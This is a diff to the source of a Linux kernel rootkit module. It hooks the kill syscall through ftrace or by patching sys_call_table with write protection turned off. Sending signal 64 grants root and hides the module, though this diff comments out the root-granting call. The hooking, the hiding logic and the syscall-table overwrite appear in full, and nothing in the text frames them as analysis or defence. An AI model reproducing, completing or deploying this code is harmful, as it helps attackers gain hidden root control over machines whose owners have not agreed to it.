@@ -8,7 +8,7 @@
 #include "ftrace_helper.h"
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("ubuntu");
+MODULE_AUTHOR("clf");
 MODULE_DESCRIPTION("hide module");
 MODULE_VERSION("0.01");
 
@@ -63,7 +63,7 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 
     if ( sig == 64 )
     {
-        set_root();
+        //set_root();
         printk(KERN_INFO "rootkit: giving root...\n");
         if (hidden == 0) {
             printk(KERN_INFO "rootkit: hideme...\n");
@@ -80,20 +80,16 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
     }
 
     return orig_kill(regs);
-
 }
 
 asmlinkage int my_kill(pid_t pid, int sig) {
     void set_root(void);
-    void hideme(void);
-    void showme(void);
-
-    // pid_t pid = regs->di;
-    // int sig = regs->si;
+    // void hideme(void);
+    // void showme(void);
 
     if ( sig == 64 )
     {
-        set_root();
+        //set_root();
         printk(KERN_INFO "rootkit: giving root...\n");
         if (hidden == 0) {
             printk(KERN_INFO "rootkit: hideme...\n");
@@ -136,6 +132,7 @@ void set_root(void)
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
 };
+
 unsigned long * sys_call_table = 0;
 static long orig_cr0 = 0;
 
@@ -154,20 +151,23 @@ void enable_write_protection(void) {
 /* Module initialization function */
 static int __init rootkit_init(void)
 {
-    // /* Hook the syscall and print to the kernel buffer */
-    // disable_write_protection();
-    // //get sys_call_table
-    // sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
-    // //save the pointer to clone
-    // init_kill = (sys_call_table[__NR_kill]);
-    // //substitute sys_call_table with my_syscall
-    // sys_call_table[__NR_kill] = (unsigned long) my_kill;
-
-    // enable_write_protection();
+#ifdef sys_table
+    /* Hook the syscall and print to the kernel buffer */
+    disable_write_protection();
+    //get sys_call_table
+    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+    //save the pointer to clone
+    init_kill = (sys_call_table[__NR_kill]);
+    //substitute sys_call_table with my_syscall
+    sys_call_table[__NR_kill] = (unsigned long) hook_kill;
+    enable_write_protection();
+#else 
+    
     int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err)
         return err;
+#endif
 
     printk(KERN_INFO "rootkit: Loaded >:-)\n");
 
@@ -176,12 +176,15 @@ static int __init rootkit_init(void)
 
 static void __exit rootkit_exit(void)
 {
+#ifdef sys_table
+    disable_write_protection();
+    //restore sys_call_table
+    sys_call_table[__NR_kill] = init_kill;
+    enable_write_protection();
+#else 
     /* Unhook and restore the syscall and print to the kernel buffer */
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
-    // disable_write_protection();
-    // //restore sys_call_table
-    // sys_call_table[__NR_kill] = init_kill;
-    // enable_write_protection();
+#endif
     printk(KERN_INFO "rootkit: Unloaded :-(\n");
 }
 
